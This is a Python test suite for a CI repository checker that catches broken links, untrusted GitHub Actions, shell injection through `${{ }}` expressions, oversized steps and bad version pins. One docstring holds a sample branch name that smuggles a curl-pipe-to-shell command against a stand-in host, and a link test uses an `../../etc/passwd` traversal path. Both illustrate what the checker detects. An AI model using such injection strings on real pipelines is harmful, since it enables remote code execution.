        self.fx.append("README.md", "\nSee [auth](/docs/auth.md).\n")
        problems = check_local_links(self.fx.load())
        self.assertProblem(problems, "broken local link", "/docs/auth.md")

    def test_link_escaping_the_repository_is_named(self) -> None:
        self.fx.append("docs/index.md", "\nSee [outside](../../etc/passwd).\n")
        problems = check_local_links(self.fx.load())
        self.assertProblem(problems, "escapes the repository")

    def test_working_links_anchors_and_external_urls_are_accepted(self) -> None:
        self.fx.append(
            "docs/index.md",
            "\n[guide](how-to-guides/use-the-pipeline.md) [anchor](#section) "
            "[site](https://example.com/x.md) [mail](mailto:a@example.com) "
            "[templated]({{ site.url }}/x.md)\n",
        )
        self.assertEqual([], check_local_links(self.fx.load()))

    def test_link_with_fragment_resolves_against_the_file(self) -> None:
        self.fx.append("docs/index.md", "\n[guide](how-to-guides/use-the-pipeline.md#setup)\n")
        self.assertEqual([], check_local_links(self.fx.load()))


class UndeclaredMarkdownTests(FixtureTestCase):
    def test_active_document_outside_the_inventory_is_named(self) -> None:
        self.fx.write("docs/how-to-guides/use-without-dockerfile.md", "# Archive shape\n")
        problems = check_undeclared_markdown(self.fx.load())
        self.assertProblem(
            problems, "undeclared active document", "docs/how-to-guides/use-without-dockerfile.md"
        )

    def test_document_under_a_historical_exclusion_is_not_flagged(self) -> None:
        self.fx.write("docs/history/2026-01-01-old-plan.md", "# Old plan\n")
        self.assertEqual([], check_undeclared_markdown(self.fx.load()))

    def test_nested_module_document_is_discovered(self) -> None:
        self.fx.write("src/quality/CLAUDE.md", "# quality guide\n")
        problems = check_undeclared_markdown(self.fx.load())
        self.assertProblem(problems, "undeclared active document", "src/quality/CLAUDE.md")


class WorkflowActionTrustTests(FixtureTestCase):
    """An action the Actions policy refuses kills the run before any check run
    exists, so the drift has to be caught in the tree rather than in a red
    pipeline that never appears."""

    def test_trusted_owner_is_accepted(self) -> None:
        self.assertEqual([], check_workflow_actions_trusted(self.fx.load()))

    def test_untrusted_owner_is_named(self) -> None:
        self.fx.append(".github/workflows/commit.yml", "      - uses: golangci/golangci-lint-action@v6\n")
        problems = check_workflow_actions_trusted(self.fx.load())
        self.assertProblem(problems, "golangci/golangci-lint-action", "startup")

    def test_untrusted_owner_makes_the_cli_fail(self) -> None:
        self.fx.append(".github/workflows/commit.yml", "      - uses: taiki-e/install-action@v2\n")
        result = self.fx.run_cli()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("taiki-e/install-action", result.stderr)

    def test_declared_third_party_action_is_accepted(self) -> None:
        self.fx.append(".github/workflows/commit.yml", "      - uses: taiki-e/install-action@v2\n")
        self.fx.inventory["workflow_actions"]["third_party_allowed"] = [
            {"action": "taiki-e/install-action", "reason": "verified creator, permitted by the policy"}
        ]
        self.assertEqual([], check_workflow_actions_trusted(self.fx.load()))

    def test_local_action_needs_no_declaration(self) -> None:
        self.fx.append(".github/workflows/commit.yml", "      - uses: ./.github/actions/install-git-cliff\n")
        self.assertEqual([], check_workflow_actions_trusted(self.fx.load()))

    def test_commented_usage_example_is_not_read_as_a_step(self) -> None:
        """The reusable workflows document their own call site in a comment.
        Reading that as a step would flag this repository's own name."""
        inv = self.fx.load()
        self.assertIn("uses: context-and-oss/cicd", (inv.root / ".github/workflows/commit.yml").read_text())
        self.assertEqual([], check_workflow_actions_trusted(inv))

    def test_nested_path_action_is_attributed_to_its_repository(self) -> None:
        self.fx.append(".github/workflows/commit.yml", "      - uses: vendor/tools/setup@v1\n")
        problems = check_workflow_actions_trusted(self.fx.load())
        self.assertProblem(problems, "vendor/tools")

    def test_third_party_entry_without_a_reason_is_refused(self) -> None:
        self.fx.inventory["workflow_actions"]["third_party_allowed"] = [
            {"action": "taiki-e/install-action"}
        ]
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("needs a 'reason'", str(ctx.exception))

    def test_workflow_actions_naming_an_unknown_group_is_refused(self) -> None:
        self.fx.inventory["workflow_actions"]["workflow_groups"] = ["nonexistent_group"]
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("unknown surface group", str(ctx.exception))

    def test_trusted_owners_with_no_group_in_scope_is_refused(self) -> None:
        """A guard whose scope is empty passes everything — refuse the shape
        rather than report OK over nothing."""
        self.fx.inventory["workflow_actions"]["workflow_groups"] = []
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("no 'workflow_groups'", str(ctx.exception))


class RunExpressionTests(FixtureTestCase):
    """GitHub substitutes `${{ }}` into a `run:` body before the shell parses
    it, so the value is shell source. A branch may legally be named
    `x";curl${IFS}evil.sh|sh;"`, and quoting the expression does not help."""

    def test_baseline_fixture_splices_nothing(self) -> None:
        self.assertEqual([], check_run_expressions(self.fx.load()))

    def test_block_body_expression_is_named(self) -> None:
        self.fx.append(
            ".github/workflows/commit.yml",
            '      - name: leak\n        run: |\n          echo "${{ github.ref_name }}"\n',
        )
        problems = check_run_expressions(self.fx.load())
        self.assertProblem(problems, "github.ref_name", "env:", "shell source")

    def test_inline_run_expression_is_named(self) -> None:
        self.fx.append(
            ".github/workflows/commit.yml",
            "      - run: echo ${{ inputs.fail-on }}\n",
        )
        self.assertProblem(check_run_expressions(self.fx.load()), "inputs.fail-on")

    def test_env_mapping_is_the_safe_route(self) -> None:
        """The same value through `env:` and read as "$NAME" is an argument."""
        self.fx.append(
            ".github/workflows/commit.yml",
            "      - name: safe\n        env:\n          BRANCH: ${{ github.ref_name }}\n"
            '        run: |\n          echo "$BRANCH"\n',
        )
        self.assertEqual([], check_run_expressions(self.fx.load()))

    def test_expression_makes_the_cli_fail(self) -> None:
        self.fx.append(
            ".github/workflows/commit.yml",
            "      - run: echo ${{ github.head_ref }}\n",
        )
        result = self.fx.run_cli()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("github.head_ref", result.stderr)


class WorkflowStepSizeTests(FixtureTestCase):
    """A `run:` body over the ceiling makes GitHub refuse the workflow at
    startup — no job, no check run, no red tick, just an absence. Same outcome
    as an untrusted action, reached by size instead of by policy, and invisible
    to actionlint and to YAML validity."""

    def _oversized(self, size: int) -> str:
        """A `run:` step whose dedented body is at least `size` bytes."""
        filler = "          echo padding-line-to-grow-the-step-body\n"
        return "      - name: big\n        run: |\n" + filler * (size // 40 + 1)

    def test_baseline_fixture_has_no_oversized_step(self) -> None:
        self.assertEqual([], check_workflow_step_sizes(self.fx.load()))

    def test_oversized_step_is_named(self) -> None:
        self.fx.append(".github/workflows/commit.yml", self._oversized(STEP_RUN_BUDGET_BYTES))
        problems = check_workflow_step_sizes(self.fx.load())
        self.assertProblem(problems, "run:", "budget", "check run")

    def test_oversized_step_makes_the_cli_fail(self) -> None:
        self.fx.append(".github/workflows/commit.yml", self._oversized(STEP_RUN_BUDGET_BYTES))
        result = self.fx.run_cli()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("startup", result.stderr)

    def test_size_is_measured_per_step_not_per_file(self) -> None:
        """The ceiling is per `run:` body: a file well over the budget in total
        is fine as long as no single step is. Proven on this repository — 60
        filler lines added to a *different* job started fine while 6 added to
        the big one did not."""
        half = self._oversized(STEP_RUN_BUDGET_BYTES // 2 - 200)
        self.fx.append(".github/workflows/commit.yml", half + half + half)
        self.assertEqual([], check_workflow_step_sizes(self.fx.load()))

    def test_body_is_measured_dedented(self) -> None:
        """GitHub runs the script, not the indentation. A body counted with its
        YAML indent would fail steps that are nowhere near the ceiling."""
        body = "\n".join(f"echo line-{i}" for i in range(3))
        text = "jobs:\n  j:\n    steps:\n      - run: |\n" + "".join(
            f"          echo line-{i}\n" for i in range(3)
        )
        self.assertEqual([(4, body)], _run_block_bodies(text))  # the `run:` line

    def test_inline_run_value_is_not_read_as_a_block(self) -> None:
        text = "jobs:\n  j:\n    steps:\n      - run: dagger develop\n      - run: |\n          echo hi\n"
        self.assertEqual([(5, "echo hi")], _run_block_bodies(text))

    def test_body_hidden_by_indentation_is_refused_not_measured_as_zero(self) -> None:
        """A body indented level with its `run:` key is not part of the block.
        Reporting 0 B would make an unparseable step the smallest possible one —
        a guard passing over nothing. It has to be named instead."""
        self.fx.append(
            ".github/workflows/commit.yml",
            "      - name: hidden\n        run: |\n        echo hi\n",
        )
        problems = check_workflow_step_sizes(self.fx.load())
        self.assertProblem(problems, "empty body", "cannot be measured")

    def test_block_ends_at_the_next_key_at_or_above_the_run_indent(self) -> None:
        """`working-directory:` after the body must not be counted into it, or a
        step's measured size would depend on what follows it."""
        text = (
            "jobs:\n  j:\n    steps:\n      - run: |\n"
            "          echo hi\n"
            "        working-directory: src/quality\n"
            "      - name: next\n"
        )
        self.assertEqual([(4, "echo hi")], _run_block_bodies(text))

    def test_blank_line_inside_a_body_stays_in_it(self) -> None:
        text = "jobs:\n  j:\n    steps:\n      - run: |\n          echo a\n\n          echo b\n"
        self.assertEqual([(4, "echo a\n\necho b")], _run_block_bodies(text))

    def test_shipped_ci_workflow_is_under_the_budget(self) -> None:
        """The guard exists because ci.yml's module-test job crossed the ceiling
        for real. Assert the shipped file directly, not only the fixture."""
        text = (REPO_ROOT / ".github/workflows/ci.yml").read_text()
        over = [
            (lineno, len(body.encode()))
            for lineno, body in _run_block_bodies(text)
            if len(body.encode()) > STEP_RUN_BUDGET_BYTES
        ]
        self.assertEqual([], over)


class SmokeWiringTests(FixtureTestCase):
    """The behavioural smokes call the real composites through Dagger and assert
    on the evidence produced, so they are the only checks that catch a pipeline
    which still compiles and has stopped doing something. They were CI-only: no
    make target ran any of them, so the whole local sweep could be green over a
    broken fixture assertion — which is how the stage-2/stage-4 break once
    reached CI instead of the author's terminal. Both wirings are asserted
    because either one missing fails silently."""

    def test_baseline_fixture_wires_every_smoke(self) -> None:
        self.assertEqual([], check_smoke_scripts_are_wired(self.fx.load()))

    def test_smoke_missing_from_the_runner_is_named(self) -> None:
        runner = self.fx.root / "scripts" / "smoke-all.sh"
        runner.write_text(runner.read_text().replace('  "stage-orchestrators.sh"\n', ""))
        problems = check_smoke_scripts_are_wired(self.fx.load())
        self.assertProblem(problems, "stage-orchestrators.sh", "SMOKES array", "make smoke")

    def test_smoke_not_run_by_any_workflow_is_named(self) -> None:
        wf = self.fx.root / ".github" / "workflows" / "commit.yml"
        wf.write_text(wf.read_text().replace("run: bash scripts/smoke/", "run: echo skipped "))
        problems = check_smoke_scripts_are_wired(self.fx.load())
        self.assertProblem(problems, "stage-orchestrators.sh", "never execute in CI")

    def test_new_smoke_with_no_wiring_is_named_for_both(self) -> None:
        """A smoke added without wiring is unrunnable locally AND absent from
        CI, and the check must say both — fixing one leaves a suite of
        assertions that reads as coverage in a place it never runs."""
        self.fx.write("scripts/smoke/brand-new.sh", SMOKE_SCRIPT)
        problems = check_smoke_scripts_are_wired(self.fx.load())
        self.assertEqual(2, len(problems), problems)
        self.assertTrue(all("brand-new.sh" in p for p in problems), problems)
        self.assertTrue(any("SMOKES array" in p for p in problems), problems)
        self.assertTrue(any("never execute in CI" in p for p in problems), problems)

    def test_runner_listing_a_script_that_does_not_exist_is_named(self) -> None:
        runner = self.fx.root / "scripts" / "smoke-all.sh"
        runner.write_text(runner.read_text().replace('SMOKES=(\n', 'SMOKES=(\n  "ghost.sh"\n'))
        problems = check_smoke_scripts_are_wired(self.fx.load())
        self.assertProblem(problems, "ghost.sh", "does not exist")

    def test_a_comment_mentioning_a_smoke_is_not_wiring(self) -> None:
        """Load-bearing. The runner's own header names smoke scripts in prose,
        so a check that searched the whole file would be satisfied by a comment
        — documentation standing in for a run, the same hole
        check_evidence_verdict refuses in the ADO templates. The fixture runner
        mentions orphan-shapes.sh in a comment and runs it nowhere."""
        self.fx.write("scripts/smoke/orphan-shapes.sh", SMOKE_SCRIPT)
        self.fx.append(
            ".github/workflows/commit.yml",
            "      - name: Orphan\n        run: bash scripts/smoke/orphan-shapes.sh\n",
        )
        problems = check_smoke_scripts_are_wired(self.fx.load())
        self.assertProblem(problems, "orphan-shapes.sh", "SMOKES array")

    def test_a_commented_out_ci_step_does_not_count_as_running_it(self) -> None:
        wf = self.fx.root / ".github" / "workflows" / "commit.yml"
        wf.write_text(
            wf.read_text().replace(
                "        run: bash scripts/smoke/stage-orchestrators.sh",
                "        # run: bash scripts/smoke/stage-orchestrators.sh",
            )
        )
        problems = check_smoke_scripts_are_wired(self.fx.load())
        self.assertProblem(problems, "stage-orchestrators.sh", "never execute in CI")

    def test_a_block_scalar_run_step_counts_too(self) -> None:
        """ci.yml invokes commit-shapes.sh from inline `run:` values and
        stage-orchestrators.sh from a `run: |` block. Both are steps, so both
        must count — reading only block scalars reported a smoke CI actually
        runs as never running, which is how _run_inline_commands came to exist."""
        wf = self.fx.root / ".github" / "workflows" / "commit.yml"
        wf.write_text(
            wf.read_text().replace(
                "        run: bash scripts/smoke/stage-orchestrators.sh",
                "        run: |\n          bash scripts/smoke/stage-orchestrators.sh",
            )
        )
        self.assertEqual([], check_smoke_scripts_are_wired(self.fx.load()))

    def test_an_unparseable_smokes_array_fails_rather_than_passes(self) -> None:
        """The array is read textually, so an unreadable one must be loud. A
        check that shrugged would report OK over nothing — the exact shape this
        repository refuses everywhere else."""
        runner = self.fx.root / "scripts" / "smoke-all.sh"
        runner.write_text(runner.read_text().replace("SMOKES=(\n", "SMOKES=( # inline\n"))
        problems = check_smoke_scripts_are_wired(self.fx.load())
        self.assertProblem(problems, "no parseable", "SMOKES")

    def test_a_missing_runner_is_named(self) -> None:
        (self.fx.root / "scripts" / "smoke-all.sh").unlink()
        problems = check_smoke_scripts_are_wired(self.fx.load())
        self.assertProblem(problems, "smoke-all.sh", "is missing", "no make target")

    def test_a_repository_with_no_smokes_has_nothing_to_wire(self) -> None:
        for path in (self.fx.root / "scripts" / "smoke").glob("*.sh"):
            path.unlink()
        self.assertEqual([], check_smoke_scripts_are_wired(self.fx.load()))

    def test_inline_run_extractor_skips_block_markers_and_comments(self) -> None:
        text = (
            "      - run: bash one.sh\n"
            "        run: |\n"
            "          bash two.sh\n"
            "      # run: bash three.sh\n"
            "        run: bash four.sh\n"
        )
        found = [cmd for _lineno, cmd in _run_inline_commands(text)]
        self.assertEqual(["bash one.sh", "bash four.sh"], found)
        self.assertEqual(["bash two.sh"], [b.strip() for _l, b in _run_block_bodies(text)])

    def test_the_cli_docstring_enumerates_every_check(self) -> None:
        """check-repo-surface.py's docstring is a numbered list of the checks,
        and it had already fallen five behind CHECKS before anyone noticed —
        the same hand-maintained-list-with-no-mechanism failure the checks
        themselves exist to catch."""
        text = (pathlib.Path(__file__).resolve().parents[1] / "check-repo-surface.py").read_text()
        numbered = [int(m) for m in re.findall(r"^\s{0,2}(\d+)\. [A-Z]", text, re.M)]
        self.assertEqual(
            list(range(1, len(CHECKS) + 1)),
            numbered,
            "the docstring's numbered checks must be 1..len(CHECKS), contiguous",
        )


class FirstCheckGateTests(FixtureTestCase):
    """A first-use evidence export is gated on `passed`, chained to the export.

    The check proves the commands are shaped to gate; it runs no scan."""

    def _readme_block(self, block: str) -> None:
        self.fx.write("README.md", "# cicd\n\nSee [the docs](docs/index.md).\n\n" + block)

    def test_baseline_fixture_is_clean(self) -> None:
        self.assertEqual([], check_first_check_gates(self.fx.load()))

    def test_an_export_with_no_gate_is_named(self) -> None:
        self._readme_block(FIRST_CHECK_BLOCK.replace(" &&\njq -e '.passed == true' ./evidence.json > /dev/null", ""))
        self.assertProblem(check_first_check_gates(self.fx.load()), "README.md:", "never gates", "evidence.json")

    def test_a_gate_on_another_file_is_not_a_gate(self) -> None:
        self._readme_block(FIRST_CHECK_BLOCK.replace("jq -e '.passed == true' ./evidence.json", "jq -e '.passed == true' ./other.json"))
        self.assertProblem(check_first_check_gates(self.fx.load()), "never gates")

    def test_a_gate_that_only_reads_is_not_a_gate(self) -> None:
        self._readme_block(FIRST_CHECK_BLOCK.replace("jq -e '.passed == true'", "jq '.passed'"))
        self.assertProblem(check_first_check_gates(self.fx.load()), "never gates")

    def test_an_unchained_gate_can_grade_a_stale_file(self) -> None:
        self._readme_block(FIRST_CHECK_BLOCK.replace("evidence.json &&\njq", "evidence.json\njq"))
        self.assertProblem(check_first_check_gates(self.fx.load()), "separate statement", "stale")

    def test_set_e_chains_the_block(self) -> None:
        block = FIRST_CHECK_BLOCK.replace("```bash\n", "```bash\nset -euo pipefail\n").replace(
            "evidence.json &&\njq", "evidence.json\njq"
        )
        self._readme_block(block)
        self.assertEqual([], check_first_check_gates(self.fx.load()))

    def test_the_tutorial_is_graded_too(self) -> None:
        self.fx.write(
            "docs/tutorials/getting-started.md",
            "# Getting started\n\n" + FIRST_CHECK_BLOCK.replace(" &&\njq -e '.passed == true' ./evidence.json > /dev/null", ""),
        )
        self.assertProblem(check_first_check_gates(self.fx.load()), "docs/tutorials/getting-started.md:")

    def test_a_readme_with_nothing_to_grade_is_named(self) -> None:
        self._readme_block("No commands here.\n")
        self.assertProblem(check_first_check_gates(self.fx.load()), "nothing")

    def test_a_missing_surface_is_named_not_skipped(self) -> None:
        (self.fx.root / "docs/tutorials/getting-started.md").unlink()
        problems = [p for p in check_first_check_gates(self.fx.load()) if "FIRST_USE_SURFACES" in p]
        self.assertEqual(1, len(problems), problems)


class SupersededRunTests(FixtureTestCase):
    """A superseded PR run is cancelled; a push to main is never grouped."""

    CALLER = "templates/github-actions/precommit.yml"

    def test_baseline_fixture_is_clean(self) -> None:
        self.assertEqual([], check_superseded_runs(self.fx.load()))

    def test_a_caller_without_the_block_is_named(self) -> None:
        self.fx.write(self.CALLER, "on:\n  pull_request:\njobs: {}\n")
        self.assertProblem(check_superseded_runs(self.fx.load()), self.CALLER, "cancel-in-progress")

    def test_a_ref_keyed_group_is_refused(self) -> None:
        """`|| github.ref` puts every push to a branch in one group, and GitHub
        cancels the pending one: the shape that skips commits."""
        text = self.fx.read(self.CALLER).replace("github.run_id", "github.ref")
        self.fx.write(self.CALLER, text)
        self.assertProblem(check_superseded_runs(self.fx.load()), self.CALLER)

    def test_a_group_without_the_workflow_name_is_refused(self) -> None:
        text = self.fx.read(self.CALLER).replace("${{ github.workflow }}-", "precommit-")
        self.fx.write(self.CALLER, text)
        self.assertProblem(check_superseded_runs(self.fx.load()), "repository-wide")

    def test_unconditional_cancel_is_refused(self) -> None:
        text = self.fx.read(self.CALLER).replace(
            "cancel-in-progress: ${{ github.event_name == 'pull_request' }}",
            "cancel-in-progress: true",
        )
        self.fx.write(self.CALLER, text)
        self.assertProblem(check_superseded_runs(self.fx.load()), self.CALLER)

    def test_a_commented_out_block_is_not_a_block(self) -> None:
        text = "".join(
            ("# " + line if line and not line.startswith(("on:", "  pull_request", "jobs", "  precommit", "    runs-on")) else line)
            for line in self.fx.read(self.CALLER).splitlines(keepends=True)
        )
        self.fx.write(self.CALLER, text)
        self.assertProblem(check_superseded_runs(self.fx.load()), self.CALLER)

    def test_a_missing_caller_is_named_not_skipped(self) -> None:
        (self.fx.root / ".github/workflows/dogfood-precommit.yml").unlink()
        self.assertProblem(check_superseded_runs(self.fx.load()), "PRECOMMIT_CALLERS")

    def test_concurrency_on_a_commit_workflow_is_refused(self) -> None:
        for rel, block in (
            ("templates/github-actions/commit.yml", "concurrency:\n  group: main\n"),
            (".github/workflows/commit.yml", "    concurrency: commit-${{ github.ref }}\n"),
        ):
            with self.subTest(rel=rel):
                fx = SurfaceFixture(self.fx.root.parent / f"fx-{rel.count('/')}")
                fx.append(rel, block)
                self.assertProblem(check_superseded_runs(fx.load()), f"{rel}:", "commit-stage evidence")

    def test_a_comment_naming_concurrency_is_not_a_block(self) -> None:
        self.fx.append("templates/github-actions/commit.yml", "# concurrency: deliberately none\n")
        self.assertEqual([], check_superseded_runs(self.fx.load()))

    def test_no_commit_workflow_at_all_is_named(self) -> None:
        for rel in ("templates/github-actions/commit.yml", ".github/workflows/commit.yml"):
            (self.fx.root / rel).unlink()
        self.assertTrue(
            any("grades nothing" in p for p in check_superseded_runs(self.fx.load()))
        )

    def test_the_live_tree_passes_and_is_graded(self) -> None:
        root = pathlib.Path(__file__).resolve().parents[2]
        inv = load_inventory(root / "scripts" / "repo-inventory.json", root)
        self.assertEqual([], check_superseded_runs(inv))
        for rel in PRECOMMIT_CALLERS:
            self.assertIn("cancel-in-progress", (root / rel).read_text())


class CrossModuleDevelopTests(FixtureTestCase):
    """`dagger develop` fails for two unrelated reasons that look identical from
    outside the step — the module does not compile, or the module chain could
    not be fetched — and scripts/ci/dagger-develop.sh exists to tell them apart.
    A `dagger call` against a module nothing developed generates that SDK inside
    the call, *outside* the wrapper, so the distinction is lost again: two of
    twelve `module-test` runs died with `load package ".": package name is
    empty` and `generate type defs: cannot find default codegen
    GraphQLMarshaller interface` on commits touching no Go file, neither was
    retried, and one of them cost the v3.8.1 release.

    What the check must get right is *coverage*, not presence: developing a
    module develops its dependencies too, and a call is only unprotected when
    nothing earlier in the same job reached it."""

    def _job(self, body: str) -> None:
        self.fx.append(".github/workflows/commit.yml", body)

    DEVELOP = '        run: bash "$GITHUB_WORKSPACE/scripts/ci/dagger-develop.sh" '

    def test_baseline_fixture_has_no_uncovered_call(self) -> None:
        self.assertEqual([], check_cross_module_develop(self.fx.load()))

    def test_call_with_no_develop_anywhere_is_named(self) -> None:
        self._job("\n  gap:\n    steps:\n      - run: dagger -m ./src/quality call check\n")
        problems = check_cross_module_develop(self.fx.load())
        self.assertProblem(problems, "src/quality", "dagger-develop.sh", "never retried")

    def test_develop_before_the_call_covers_it(self) -> None:
        self._job(
            "\n  ok:\n    steps:\n      - name: develop\n"
            + self.DEVELOP
            + "src/quality\n      - run: dagger -m ./src/quality call check\n"
        )
        self.assertEqual([], check_cross_module_develop(self.fx.load()))

    def test_develop_after_the_call_does_not_cover_it(self) -> None:
        """Order is the whole point. The call that runs first is the one that
        pays for the codegen, so a develop below it protects nothing — and a
        check that only asked "does this job mention the wrapper?" would call
        the broken ordering clean."""
        self._job(
            "\n  late:\n    steps:\n      - run: dagger -m ./src/quality call check\n"
            "      - name: develop\n" + self.DEVELOP + "src/quality\n"
        )
        problems = check_cross_module_develop(self.fx.load())
        self.assertProblem(problems, "src/quality", "dagger-develop.sh")

    def test_develop_in_another_job_does_not_cover_this_one(self) -> None:
        """An engine, and therefore a generated SDK, is never shared between two
        jobs."""
        self._job(
            "\n  first:\n    steps:\n      - name: develop\n" + self.DEVELOP + "src/quality\n"
            "\n  second:\n    steps:\n      - run: dagger -m ./src/quality call check\n"
        )
        problems = check_cross_module_develop(self.fx.load())
        self.assertProblem(problems, "second", "src/quality")

    def test_a_dependency_of_the_developed_module_is_covered(self) -> None:
        """`dagger develop` cannot generate a module's bindings without loading
        every module it depends on, so the dependency's codegen runs inside the
        wrapper and its flakes are retried. Requiring a second explicit develop
        here would be noise the next author deletes."""
        self.fx.write(
            "src/composites/commit/dagger.json",
            '{"name": "commit", "sdk": "go", "dependencies": '
            '[{"name": "quality", "source": "../../quality"}]}\n',
        )
        self._job(
            "\n  closure:\n    steps:\n      - name: develop\n"
            + self.DEVELOP
            + "src/composites/commit\n      - run: dagger -m ./src/quality call check\n"
        )
        self.assertEqual([], check_cross_module_develop(self.fx.load()))

    def test_a_git_dependency_covers_nothing_local(self) -> None:
        """A dependency fetched from git is not a module in this repository and
        nothing here develops it, so it must not widen the closure."""
        self.fx.write(
            "src/composites/commit/dagger.json",
            '{"name": "commit", "sdk": "go", "dependencies": '
            '[{"name": "q", "source": "github.com/example-org/other/src/quality"}]}\n',
        )
        self._job(
            "\n  gitdep:\n    steps:\n      - name: develop\n"
            + self.DEVELOP
            + "src/composites/commit\n      - run: dagger -m ./src/quality call check\n"
        )
        problems = check_cross_module_develop(self.fx.load())
        self.assertProblem(problems, "src/quality")

    def test_module_variable_needs_the_wrapper_on_the_same_variable(self) -> None:
        self._job(
            "\n  matrix:\n    steps:\n      - run: dagger -m \"./$MODULE\" call check\n"
        )
        problems = check_cross_module_develop(self.fx.load())
        self.assertProblem(problems, "$MODULE", "dagger-develop.sh")

        self.fx.write(
            ".github/workflows/commit.yml",
            self.fx.read(".github/workflows/commit.yml").replace(
                "  matrix:\n    steps:\n",
                '  matrix:\n    steps:\n      - run: bash "$GITHUB_WORKSPACE/scripts/ci/dagger-develop.sh" "$MODULE"\n',
            ),
        )
        self.assertEqual([], check_cross_module_develop(self.fx.load()))

    def test_a_multi_label_case_arm_is_covered_only_by_the_intersection(self) -> None:
        """`src/quality|src/composites/commit)` runs for whichever cell matched,
        and "$MODULE" developed exactly that one. Taking the union of both
        closures would let each label vouch for the other's calls and hide
        precisely the stage-2/stage-4 cross-call this check was written for."""
        self._job(
            "\n  arm:\n    steps:\n"
            '      - run: bash "$GITHUB_WORKSPACE/scripts/ci/dagger-develop.sh" "$MODULE"\n'
            "      - run: |\n"
            "          case \"$MODULE\" in\n"
            "            src/quality|src/composites/commit)\n"
            "              dagger -m ./src/quality call check\n"
            "              ;;\n"
            "          esac\n"
        )
        problems = check_cross_module_develop(self.fx.load())
        self.assertProblem(problems, "src/quality", "src/quality|src/composites/commit")

    def test_a_single_label_arm_covers_its_own_module(self) -> None:
        self._job(
            "\n  own:\n    steps:\n"
            '      - run: bash "$GITHUB_WORKSPACE/scripts/ci/dagger-develop.sh" "$MODULE"\n'
            "      - run: |\n"
            "          case \"$MODULE\" in\n"
            "            src/quality)\n"
            "              dagger -m ./src/quality call check\n"
            "              ;;\n"
            "          esac\n"
        )
        self.assertEqual([], check_cross_module_develop(self.fx.load()))

    def test_a_call_inside_a_smoke_script_is_followed(self) -> None:
        """A `dagger -m` line running in scripts/smoke/*.sh is exactly as
        unwrapped as one written inline in the workflow, and reading only the
        workflow is how commit-apps.sh's cross-module call stayed invisible."""
        self.fx.write(
            "scripts/smoke/stage-orchestrators.sh",
            SMOKE_SCRIPT + "dagger -m ./src/quality call check\n",
        )
        problems = check_cross_module_develop(self.fx.load())
        self.assertProblem(problems, "src/quality")

    def test_a_comment_naming_a_module_is_not_a_call(self) -> None:
        """Load-bearing. The first version of this check read `dagger functions
        -m ./src/stage-N` out of a smoke script's header comment and reported a
        module that does not exist — prose standing in for a run, backwards."""
        self._job(
            "\n  prose:\n    steps:\n"
            "      - run: |\n"
            "          # dagger -m ./src/quality call check  (how you would do it by hand)\n"
            "          echo skipped\n"
        )
        self.assertEqual([], check_cross_module_develop(self.fx.load()))

    def test_a_consumer_pinned_module_reference_is_left_alone(self) -> None:
        """A template's `dagger -m github.com/context-and-oss/cicd/...@v9.9.9` names
        a module the CLI fetches from git; no develop in this repository could
        cover it, and flagging it would make the check unusable in the one file
        consumers copy."""
        self._job(
            f"\n  consumer:\n    steps:\n      - run: dagger -m {_pin('src/quality')} call check\n"
        )
        self.assertEqual([], check_cross_module_develop(self.fx.load()))
class CicdRefShapeTests(FixtureTestCase):
    """Every pin mechanism in repo_surface.py keys on `@vX.Y.Z` — the skew scan,
    the release bumper's rewrite patterns, and the command-exists resolver. A
    reference in any other shape matches none of them, so it is not reported as
    wrong; it is not seen, and three checks go quiet at once.

    v3.8.4 shipped `.github/workflows/dast.yml` pinned twice to
    `github.com/context-and-oss/cicd/src/composites/dast@fix/dast-evidence-write`, a
    branch deleted when its pull request merged. Every consumer of
    `dast.yml@v3.8.4` got a module the CLI cannot resolve, and both
    check-workflow-pins.py and check-repo-surface.py reported OK."""

    def _ref(self, ref: str) -> None:
        self.fx.append(
            ".github/workflows/commit.yml",
            f"      - run: dagger -m github.com/context-and-oss/cicd/src/quality@{ref} call check\n",
        )

    def test_baseline_fixture_uses_only_version_pins(self) -> None:
        self.assertEqual([], check_cicd_refs_are_versions(self.fx.load()))

    def test_the_branch_ref_that_shipped_in_v3_8_4_is_named(self) -> None:
        self._ref("fix/dast-evidence-write")
        problems = check_cicd_refs_are_versions(self.fx.load())
        self.assertProblem(problems, "fix/dast-evidence-write", "not a version pin")

    def test_a_moving_major_ref_is_named(self) -> None:
        """`@v1` looks like the idiomatic GitHub Actions form and is not one
        here: this repository publishes no moving major tag, so `@v1` resolves
        to nothing at all."""
        self._ref("v1")
        self.assertProblem(check_cicd_refs_are_versions(self.fx.load()), "@v1", "not a version pin")

    def test_main_is_named(self) -> None:
        self._ref("main")
        self.assertProblem(check_cicd_refs_are_versions(self.fx.load()), "@main")

    def test_a_commit_sha_is_named(self) -> None:
        """A sha is immutable and therefore tempting. It is still refused: the
        bumper cannot rewrite it, so it silently outlives every release."""
        self._ref("035a40f1b2c3d4e5f60718293a4b5c6d7e8f9012")
        self.assertProblem(check_cicd_refs_are_versions(self.fx.load()), "not a version pin")

    def test_an_exact_version_is_accepted(self) -> None:
        self._ref(f"v{FIXTURE_VERSION}")
        self.assertEqual([], check_cicd_refs_are_versions(self.fx.load()))

    def test_an_unrelated_projects_branch_ref_is_left_alone(self) -> None:
        """Scoped to context-and-oss/cicd, like every other pin pattern here. A
        document may legitimately show another project pinned however that
        project pins."""
        self.fx.append(
            "docs/index.md", "\nExample: `github.com/acme/shared-models@some-branch`\n"
        )
        self.assertEqual([], check_cicd_refs_are_versions(self.fx.load()))

    def test_a_historical_document_may_keep_the_broken_ref(self) -> None:
        """Specs and dated notes record what was true when they were written. A
        check that forced them to rewrite history would make the record useless
        — and the spec for this very fix quotes the broken ref."""
        self.fx.write(
            "docs/history/note.md",
            "It shipped as `github.com/context-and-oss/cicd/src/composites/dast@fix/dast-evidence-write`.\n",
        )
        self.assertEqual([], check_cicd_refs_are_versions(self.fx.load()))

    def test_the_release_blocking_gate_refuses_it_too(self) -> None:
        """Load-bearing. The CI gate's scope is deliberately narrow — only
        failures a release commit could repair — and this one qualifies: the
        repair is a pin rewrite, the same repair skew needs. Leaving it out of
        the gate is what let a broken ref reach a tag."""
        self._ref("fix/dast-evidence-write")
        result = self.fx.run_pins_cli()
        self.assertEqual(1, result.returncode, result.stdout)
